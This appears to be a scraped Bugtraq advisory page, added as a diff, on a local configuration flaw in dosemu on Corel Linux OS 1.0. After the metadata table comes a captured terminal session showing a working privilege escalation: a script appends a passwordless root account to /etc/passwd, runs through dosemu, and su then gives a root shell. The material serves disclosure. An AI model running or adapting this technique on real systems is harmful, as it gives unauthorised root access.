@@ -1,0 +1,95 @@
+<p><b><span style="font-size: 18pt;">Corel Linux Dosemu Distribution Configuration Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/1030/info">info</a><br><a href="http://www.securityfocus.com/bid/1030/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/1030/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/1030/solution">solution</a><br><a href="http://www.securityfocus.com/bid/1030/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				1030
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Configuration Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Mar 02 2000 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Mar 02 2000 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				This vulnerability was posted to the Bugtraq mailing list by suid@suid.kg on March 2, 2000.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Corel Linux OS 1.0 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	Script started on Fri Feb 25 13:54:00 2000<br/>nebula:~$ id<br/>uid=1000(suid) gid=1000(suid) groups=1000(suid)<br/>nebula:~$ cat &gt; hack-corel<br/>#!/bin/bash<br/>echo "owned::0:0::/:/bin/bash" &gt;&gt; /etc/passwd<br/>^D<br/>nebula:~$ chmod a+rx hack-corel<br/>nebula:~$ export PATH="$PATH:."<br/>nebula:~$ dos<br/>CPU speed set to 430/1 MHz<br/>Running on CPU=586, FPU=1, rdtsc=1<br/> <br/> snip bunch of dosemu crap <br/><br/>"Welcome to dosemu 0.98!<br/>C:\&gt; system hack-corel; <br/>sh: : command not found <br/>C:\&gt; exitERROR: general protection at 0x3f0ff: 0<br/>ERROR: SIGSEGV, protected insn...exiting!<br/>nebula:~$ tail -1 /etc/passwd<br/>owned::0:0::/:/bin/bash<br/>nebula:~$ su owned<br/>nebula:/home/suid# id<br/>uid=0(root) gid=0(root) groups=0(root)<br/>nebula:/home/suid# exit<br/>exit<br/>nebula:~$ exit
+	
+		<ul>
+</ul>
+</div>
